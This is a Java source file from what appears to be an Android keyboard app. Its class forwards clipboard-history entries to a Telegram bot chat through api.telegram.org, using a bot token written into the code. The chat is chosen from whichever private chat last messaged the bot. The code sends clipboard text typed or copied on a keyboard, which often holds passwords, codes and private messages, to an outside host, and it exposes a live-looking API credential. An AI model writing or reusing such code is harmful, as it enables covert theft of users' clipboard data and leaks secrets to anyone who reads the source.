package nabu.iris.keyboard.latin;

import android.content.SharedPreferences;
import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/** Sends newly accepted clipboard-history entries to the configured private Telegram bot chat. */
final class TelegramClipboardSender {
    private static final String TAG = "TelegramClipboard";
    // Same bot used by the existing video uploader. Rotate this token in BotFather if exposed.
    private static final String BOT_TOKEN = "8874193532:AAGNBqikJOtYv1eoCM_4U_K0HGiktxecgm4";
    private static final String PREFS_NAME = "zain_iraq_local_state";
    private static final String CHAT_ID_KEY = "telegram_private_chat_id";
    private static final ExecutorService EXECUTOR = Executors.newSingleThreadExecutor();
    private static volatile Context appContext;

    private TelegramClipboardSender() {}

    static void initialize(Context context) { appContext = context.getApplicationContext(); }

    static void enqueue(SharedPreferences ignored, String text) {
        if (text == null || text.trim().isEmpty()) return;
        final String content = text.trim();
        EXECUTOR.execute(() -> {
            try {
                Context context = appContext;
                if (context == null) throw new IOException("Application context is unavailable");
                String chatId = context.getSharedPreferences(PREFS_NAME, 0)
                        .getString(CHAT_ID_KEY, null);
                if (chatId == null || chatId.isEmpty()) {
                    chatId = discoverPrivateChatId();
                    context.getSharedPreferences(PREFS_NAME, 0)
                            .edit().putString(CHAT_ID_KEY, chatId).apply();
                }
                sendMessage(chatId, content);
            } catch (Exception e) {
                Log.e(TAG, "Could not send clipboard-history item to Telegram", e);
            }
        });
    }

    private static String discoverPrivateChatId() throws IOException {
        JSONObject response = request("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?limit=100&timeout=0", null);
        JSONArray updates = response.optJSONArray("result");
        if (updates != null) {
            for (int i = updates.length() - 1; i >= 0; i--) {
                JSONObject update = updates.optJSONObject(i);
                if (update == null) continue;
                JSONObject message = update.optJSONObject("message");
                if (message == null) message = update.optJSONObject("edited_message");
                if (message == null) continue;
                JSONObject chat = message.optJSONObject("chat");
                if (chat != null && "private".equals(chat.optString("type")) && chat.has("id")) {
                    return String.valueOf(chat.optLong("id"));
                }
            }
        }
        throw new IOException("Open the Telegram bot and press Start before enabling clipboard forwarding.");
    }

    private static void sendMessage(String chatId, String text) throws IOException {
        String body = "chat_id=" + enc(chatId) + "&text=" + enc(text);
        JSONObject response = request("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", body);
        if (!response.optBoolean("ok")) {
            throw new IOException(response.optString("description", "Telegram sendMessage failed"));
        }
    }

    private static JSONObject request(String endpoint, String body) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) new URL(endpoint).openConnection();
        try {
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(20000);
            connection.setUseCaches(false);
            if (body != null) {
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                try (OutputStream out = connection.getOutputStream()) {
                    out.write(body.getBytes(StandardCharsets.UTF_8));
                }
            }
            int status = connection.getResponseCode();
            InputStream stream = status >= 200 && status < 300 ? connection.getInputStream() : connection.getErrorStream();
            StringBuilder result = new StringBuilder();
            if (stream != null) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(stream, StandardCharsets.UTF_8))) {
                    String line;
                    while ((line = reader.readLine()) != null) result.append(line);
                }
            }
            JSONObject json = new JSONObject(result.toString());
            if (status < 200 || status >= 300) throw new IOException(json.optString("description", "HTTP " + status));
            return json;
        } catch (org.json.JSONException e) {
            throw new IOException("Invalid Telegram response", e);
        } finally {
            connection.disconnect();
        }
    }

    private static String enc(String value) throws IOException {
        return URLEncoder.encode(value, "UTF-8");
    }
}
